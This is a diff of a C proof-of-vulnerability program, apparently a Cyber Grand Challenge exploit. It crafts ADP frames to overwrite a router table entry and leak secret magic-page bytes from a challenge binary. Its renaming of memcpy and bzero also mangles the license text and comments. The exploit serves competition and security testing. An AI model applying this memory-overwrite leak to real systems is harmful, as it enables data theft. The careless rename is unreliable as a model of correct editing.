@@ -4,7 +4,7 @@ Author: Joe Rogers <joe@cromulence.com>
 
 Copyright (c) 2015 Cromulence LLC
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
+Permission is hereby granted, __free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
@@ -30,14 +30,14 @@ THE SOFTWARE.
 
 unsigned char decoded_magic_page[500];
 
-void memcpy(unsigned char *Dst, unsigned char *Src, uint32_t Len) {
+void __memcpy(unsigned char *Dst, unsigned char *Src, uint32_t Len) {
 	uint32_t i;
 	for (i = 0; i < Len; i++) {
 		Dst[i] = Src[i];
 	}
 }
 
-void bzero(unsigned char *Buf, uint32_t Len) {
+void __bzero(unsigned char *Buf, uint32_t Len) {
 	uint32_t i;
 	for (i = 0; i < Len; i++) {
 		Buf[i] = 0;
@@ -165,7 +165,7 @@ uint8_t BuildL2Frame(uint16_t L2Dst, uint16_t L2Src, uint8_t Vlan, unsigned char
 
 	Sum = Checksum(Frame);
 
-	memcpy(Frame+L2_HDR_LEN+L3_HDR_LEN+pL3->Len, (unsigned char *)&Sum, 4);
+	__memcpy(Frame+L2_HDR_LEN+L3_HDR_LEN+pL3->Len, (unsigned char *)&Sum, 4);
 
 	return(L2_HDR_LEN+pL2->Len);
 }
@@ -189,7 +189,7 @@ uint8_t BuildL4Segment(unsigned char L4Dst, unsigned char L4Src, unsigned char *
 	pL4->Dst = L4Dst;
 	pL4->Src = L4Src;
 	pL4->Len = DataLen;
-	memcpy(Frame+L2_HDR_LEN+L3_HDR_LEN+L4_HDR_LEN, Data, DataLen);
+	__memcpy(Frame+L2_HDR_LEN+L3_HDR_LEN+L4_HDR_LEN, Data, DataLen);
 
 	return(L4_HDR_LEN+pL4->Len);
 
@@ -215,7 +215,7 @@ uint8_t BuildAdpRequest(uint32_t L3AdpAddr, uint16_t L2Src, uint8_t Vlan, unsign
 
 	Sum = Checksum(Frame);
 
-	memcpy(Frame+L2_HDR_LEN+L2_ADJ_LEN, (unsigned char *)&Sum, 4);
+	__memcpy(Frame+L2_HDR_LEN+L2_ADJ_LEN, (unsigned char *)&Sum, 4);
 
 	return(L2_HDR_LEN+L2_ADJ_LEN+L2_FTR_LEN);
 
@@ -241,7 +241,7 @@ uint8_t BuildAdpResponse(uint32_t L3AdpAddr, uint32_t L2AdpAddr, uint16_t L2Dst,
 
 	Sum = Checksum(Frame);
 
-	memcpy(Frame+L2_HDR_LEN+L2_ADJ_LEN, (unsigned char *)&Sum, 4);
+	__memcpy(Frame+L2_HDR_LEN+L2_ADJ_LEN, (unsigned char *)&Sum, 4);
 
 	return(L2_HDR_LEN+L2_ADJ_LEN+L2_FTR_LEN);
 
@@ -269,7 +269,7 @@ int main(void) {
 	// negotiate a Type2 POV with the Competition Framework
 	NegotiateType2Pov(&type2_addr, &type2_size, &type2_length);
 
-	// force the pov to sleep letting the router and cb_3 processes
+	// force the pov to __sleep letting the router and cb_3 processes
 	// exchange their echo packets so that SendQueue[0] has the desired
 	// Frame data
 	FD_ZERO(&readfds);
@@ -281,7 +281,7 @@ int main(void) {
 	// send 13 gratuitous ADP packets for different L3Addr's
 	uint32_t L3Addr = 0x0a010110;
 	for (i = 0; i < 13; i++, L3Addr++) {
-		bzero(Frame, MAX_FRAME_SIZE);
+		__bzero(Frame, MAX_FRAME_SIZE);
 		Len = BuildAdpResponse(L3Addr, 0x1001, 0x0001, 0x1000, 0, Frame);
 		SendBytes(STDOUT, Frame, Len);
 	}
@@ -293,7 +293,7 @@ int main(void) {
 	//
 	// the L2Addr of the ADP header should overwrite the 1-byte Valid
 	// with a non-zero value and the 1-byte Age field with 0xfe.
-	bzero(Frame, MAX_FRAME_SIZE);
+	__bzero(Frame, MAX_FRAME_SIZE);
 	Len = BuildAdpResponse(0x0a010102, 0x0001, 0x0001, 0x1000, 0, Frame);
 	//                                   ^ ^
 	//                                Age| |Valid
@@ -304,7 +304,7 @@ int main(void) {
 	// The router will forward it back to VLAN 1, but to an unknown unicast L2Addr
 	// so the switch will drop it
 	for (i = 0; i < 8; i++) {
-		bzero(Frame, MAX_FRAME_SIZE);
+		__bzero(Frame, MAX_FRAME_SIZE);
 	        BuildL4Segment(ECHO_L4ADDR, 0x41, (unsigned char *)"AA", 2, Frame);
 	        BuildL3Packet(L3Addr-1, 0x0a010102, Frame);
 	        EchoLen = BuildL2Frame(0x0001, 0x1000, 0, Frame);
@@ -313,34 +313,34 @@ int main(void) {
 
 	// Finally, create ADP entry for the addr we over-wrote
 	// allowing the queued packet to be sent
-	bzero(Frame, MAX_FRAME_SIZE);
+	__bzero(Frame, MAX_FRAME_SIZE);
 	Len = BuildAdpResponse(0x0a010102, 0x1000, 0x0001, 0x1000, 0, Frame);
 	SendBytes(STDOUT, Frame, Len);
 
-	// read in the ADP frame that'll be sent before the target frame
-	bzero(Frame, MAX_FRAME_SIZE);
+	// __read in the ADP frame that'll be sent before the target frame
+	__bzero(Frame, MAX_FRAME_SIZE);
 	ReadBytes(STDIN, Frame, sizeof(L2Hdr)+sizeof(L2Adjacency)+4);
 	
-	// see if we have a packet to read 
+	// see if we have a packet to __read 
 	FD_ZERO(&readfds);
 	FD_SET(STDIN, &readfds);
 	timeout.tv_sec = 2;
 	timeout.tv_usec = 0;
 	if (fdwait(STDIN+1, &readfds, NULL, &timeout, &readyfds) != 0) {
 		SendBytes(STDOUT, (unsigned char *)"diedie!", 7);
-		bzero(Frame, MAX_FRAME_SIZE);
+		__bzero(Frame, MAX_FRAME_SIZE);
 		SendBytes(FRAMEWORK, Frame, 4);
 		_terminate(0);	
 	}
 	if (readyfds == 0) {
 		SendBytes(STDOUT, (unsigned char *)"diedie!", 7);
-		bzero(Frame, MAX_FRAME_SIZE);
+		__bzero(Frame, MAX_FRAME_SIZE);
 		SendBytes(FRAMEWORK, Frame, 4);
 		_terminate(0);	
 	}
 
-	// read the forwarded frame
-	bzero(Frame, MAX_FRAME_SIZE);
+	// __read the forwarded frame
+	__bzero(Frame, MAX_FRAME_SIZE);
 	ReadBytes(STDIN, Frame, sizeof(L2Hdr)+sizeof(L3Hdr)+sizeof(L4Hdr)+4+4);
 	
 	// send the recovered page bytes to the competition framework
